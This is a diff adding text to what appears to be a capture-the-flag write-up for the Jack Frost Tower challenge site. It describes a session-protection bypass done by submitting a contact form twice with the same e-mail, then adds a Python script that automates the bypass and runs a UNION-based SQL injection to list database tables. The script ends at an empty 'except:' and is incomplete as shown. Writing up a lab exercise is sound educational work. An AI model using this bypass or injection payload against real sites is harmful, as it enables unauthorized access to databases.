@@ -1703,7 +1703,11 @@ Who knows? Maybe you’ll even find more than one vulnerability in the code.</p>
 <h3 id="circumvent-the-session-protection">
 <a class="anchor" href="#circumvent-the-session-protection" aria-hidden="true"><span class="octicon octicon-link"></span></a>Circumvent the session protection</h3>
 
-<p>Goto <a href="https://staging.jackfrosttower.com/contact" target="_blank" rel="noopener noreferrer">https://staging.jackfrosttower.com/contact</a></p>
+<p>If you look into the code <code class="language-plaintext highlighter-rouge">server.js</code> you can find:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/12_postcontact_session_error.png" width="100%" alt="Postcontact Session Error"></p>
+
+<p>So you will get a valid session cookie if you enter an e-mail address twice in this form. To do this goto <a href="https://staging.jackfrosttower.com/contact" target="_blank" rel="noopener noreferrer">https://staging.jackfrosttower.com/contact</a></p>
 
 <p>fill the form and do it twice with an equal e-mail:</p>
 
@@ -1711,10 +1715,57 @@ Who knows? Maybe you’ll even find more than one vulnerability in the code.</p>
 
 <p>until you get “Email Already Exists”</p>
 
+<p>After that you directly can goto <a href="https://staging.jackfrosttower.com/postcontact" target="_blank" rel="noopener noreferrer">https://staging.jackfrosttower.com/postcontact</a></p>
+
 <h3 id="exploit-an-sql-injection-vulnerability">
 <a class="anchor" href="#exploit-an-sql-injection-vulnerability" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploit an SQL injection vulnerability</h3>
 
 <p>The vulnerable code is in the details page.</p>
+
+<p>To get all tables in the database you can use</p>
+
+<pre><code class="python">#!/usr/bin/env python3
+import urllib
+
+import requests
+import requests as req
+from bs4 import BeautifulSoup
+
+s = requests.Session()
+
+resp = s.get("https://staging.jackfrosttower.com/")
+resp = s.get("https://staging.jackfrosttower.com/contact")
+
+soup = BeautifulSoup(resp.text, 'lxml')
+csrfToken = soup.input["value"]
+
+resp = s.post("https://staging.jackfrosttower.com/postcontact", allow_redirects=True, data={
+        "_csrf": csrfToken,
+        "fullname" : "abc",
+        "email" : "a%40b.c",
+        "phone": "123",
+        "country": "Bangladesh",
+        "submit": "SAVE"})
+
+soup = BeautifulSoup(resp.text, 'lxml')
+csrfToken = soup.input["value"]
+
+resp = s.post("https://staging.jackfrosttower.com/postcontact", allow_redirects=True, data={
+        "_csrf": csrfToken,
+        "fullname" : "abc",
+        "email" : "a%40b.c",
+        "phone": "123",
+        "country": "Bangladesh",
+        "submit": "SAVE"})
+
+for i in range(0,100):
+        try:
+                resp = s.get("https://staging.jackfrosttower.com/detail/1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT table_name FROM information_schema. tables limit 1 offset "+str(i)+")C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) -- ")
+                soup = BeautifulSoup(resp.text, 'lxml')
+                ul = soup.find_all("ul", {"class":"datadetail"})[2]
+                print(ul.li.string)
+        except:
+</code></pre>
 
 <h1 id="achievements">
 <a class="anchor" href="#achievements" aria-hidden="true"><span class="octicon octicon-link"></span></a>Achievements</h1>
